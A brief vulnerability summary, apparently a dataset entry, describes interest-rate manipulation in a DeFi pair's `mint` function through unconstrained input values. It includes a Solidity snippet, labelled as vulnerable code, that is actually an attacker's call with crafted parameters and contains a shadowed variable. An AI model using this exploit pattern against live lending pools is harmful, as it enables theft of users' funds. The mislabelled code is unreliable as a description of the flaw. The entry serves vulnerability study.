Type of vulnerability: Interest Rate Manipulation
Cause of vulnerability: Lack of constraints on user input in the `mint` function
Execution process: An attacker manipulates the interest rate by calling the `mint` function with arbitrary values for `xIncrease`, `yIncrease`, and `zIncrease`, paying minimal amounts of Asset Token and Collateral Token.
Vulnerable code: 
```solidity
function timeswapMint(uint maturity, uint112 APR, address pairAddress) public {
    uint256 maturity = maturity;
    console.log("Maturity: ", maturity);
    address liquidityTo = address(this);
    address dueTo = address(this);
    uint112 xIncrease = 3;
    uint112 yIncrease = 1000000000000000;
    uint112 zIncrease = 5; // Static 167% CDP
    IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, "");
}
```
